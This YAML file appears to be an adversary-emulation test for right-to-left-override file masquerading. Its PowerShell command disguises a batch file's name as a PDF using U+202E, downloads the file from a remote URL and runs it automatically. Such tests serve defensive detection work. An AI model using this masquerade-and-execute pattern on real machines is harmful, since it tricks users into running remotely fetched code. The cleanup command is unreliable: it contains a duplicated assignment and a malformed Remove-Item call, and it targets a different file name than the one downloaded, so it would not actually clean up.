- name: 'Masquerading: RTLO Masqueraded File Download and Execution'
  description: Downloads a batch file that has an obfuscated name utilizing the RTLO operator. The batch file then runs automatically, opening a cmd window and then closing 5 seconds later
  supported_platforms:
    - windows
  input_arguments:
    fileloc:
      type: path
      default: '[System.IO.Path]::Combine($env:USERPROFILE, "Downloads")'
      description: Location you want to download the file to. Default is the downloads folder
  executor:
    command: |-
      $rtlo = [char]0x202E
      $fileloc = Join-Path "#{fileloc}" ("evil_batch" + $rtlo + "fdp.bat")
      Invoke-WebRequest -Uri "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1036.002/src/evil_batch.bat" -OutFile $fileloc -UseBasicParsing
      Start-Process -FilePath $fileloc
    cleanup_command: |-
      $rtlo = [char]0x202E
      $fileloc = $fileloc = Join-Path "#{fileloc}" ("evil_file" + $rtlo + "fdp.bat")
      Remove-Item = $fileloc
    name: powershell
    elevation_required: false


